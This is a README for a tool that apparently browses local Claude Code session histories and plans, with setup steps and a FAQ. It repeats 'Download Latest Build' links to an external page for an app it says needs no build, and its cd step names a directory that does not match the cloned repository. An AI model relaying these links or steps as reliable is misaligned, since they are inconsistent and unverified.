# CC Quick History Inspector - Local Session History Inspector 2026

> **CC Quick History Inspector is a browser-based local utility for finding, sorting, and revisiting Claude Code sessions and plans in a streamlined timeline view.**

[![Platform](https://img.shields.io/badge/Platform-Web%20browser-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-Not%20specified-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/brandonzzparker428/cc-quick-session-inspector?style=flat-square)](https://github.com/brandonzzparker428/cc-quick-session-inspector)

---

<p align="center">
  <a href="https://brandonzzparker428.github.io/cc-quick-session-inspector/">
    <img src="https://img.shields.io/badge/Download-CC%20Quick%20History%20Inspector%20Latest-brightgreen?style=for-the-badge" alt="Download CC Quick History Inspector">
  </a>
</p>

> **[Download CC Quick History Inspector](https://brandonzzparker428.github.io/cc-quick-session-inspector/)**

---

[Download Latest Build](https://brandonzzparker428.github.io/cc-quick-session-inspector/)

---

## Explore Claude Code History Locally

CC Quick History Inspector turns Claude Code's JSONL session history into a searchable browser workspace. Review sessions, plans, project paths, messages, and tool activity without opening history files one at a time.

Built for developers working with local Claude Code data, the inspector combines chronological browsing with project organization and links between plans and the sessions that produced them. Rendered messages, plan content, and copy-ready resume commands make past work easier to understand and continue.

---

## Core Capabilities

- Find Claude Code sessions with search and filtering tools.
- Follow session activity in chronological timeline form.
- Group and examine sessions by project or working directory.
- Associate plan files with their originating sessions.
- Create Claude Code resume commands that are ready to paste.
- Display Markdown plans and assistant messages directly in the browser.
- Narrow messages by role or tool, with summaries of tool calls.
- Collapse conversation turns, shorten lengthy messages, and copy prompts, responses, plans, or resume commands.
- Keep interface preferences in browser `localStorage`.
- Work entirely on the local machine without a build step or external services.

---

## Getting Started

First, clone the repository and enter its directory:

```bash
git clone https://github.com/brandonzzparker428/cc-quick-session-inspector.git
cd cc-quick-history-inspector
```

This is a local browser application with no compilation or build process. Start a local web server for the repository directory and visit the address it reports.

If Node.js is available, you can use:

```bash
npx serve .
```

Open the resulting local URL in your browser. When the application asks for data, grant it access to the Claude Code session history and plan files you want to inspect.

---

## Using the Inspector

1. Launch a local server in the project directory.
2. Visit the application in a modern web browser.
3. Load or choose the local Claude Code history data.
4. Search across sessions, projects, working directories, plans, messages, and tools.
5. Open a session to view its timeline and individual conversation turns.
6. Copy a prompt, response, plan, or resume command using the available controls.
7. Paste a generated resume command into Claude Code to continue work from an earlier session.

Role and tool filters can reduce the timeline to relevant activity. Conversation turns may also be collapsed or truncated, which is useful when reviewing large sessions.

---

## Preferences and Configuration

The application keeps interface preferences in the browser's `localStorage`. As a result, display and filter selections can remain available on later visits within the same browser profile.

Normal operation does not require a configuration file or build configuration. Serve the repository directory and manage the session view, filters, and display options through the application's browser controls.

---

## Requirements

- A current web browser.
- Node.js if you want to use the optional local static server workflow.
- Local Claude Code session history and plan data in JSONL-compatible form.
- Sufficient browser storage for interface preferences and loaded session data.
- No compilation process or external service.

---

## Frequently Asked Questions

### What is CC Quick History Inspector intended for?

It is aimed at Claude Code users who need to search, examine, and return to locally stored sessions and plans.

### Does it change the history files?

The inspector is intended for viewing and reviewing session data. Keep the original files available and apply your own data-handling practices when loading local content.

### How can I update it?

Pull the newest repository changes or download the latest build, then serve the refreshed project directory:

```bash
git pull
npx serve .
```

### Where does the application keep my display settings?

Interface preferences are stored in `localStorage` for the active browser profile.

### What should I check if the page does not open?

Make sure the local server is running, use the precise address printed by the server, and confirm that the command was launched from the project directory. Using a current browser is recommended as well.

### Why is a session missing from the results?

Check that the expected history data has been loaded. You can also adjust the project, working-directory, role, and tool filters to expand or narrow the results.

### Is it possible to continue an older session?

When the necessary session information is available, the inspector produces a Claude Code resume command that you can paste into Claude Code.

---

## Planned Improvements

- Further refine search and filtering workflows.
- Make movement through large timelines more efficient.
- Add more ways to present plans, messages, and tool activity.
- Maintain a focused local-browser workflow with no build step.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
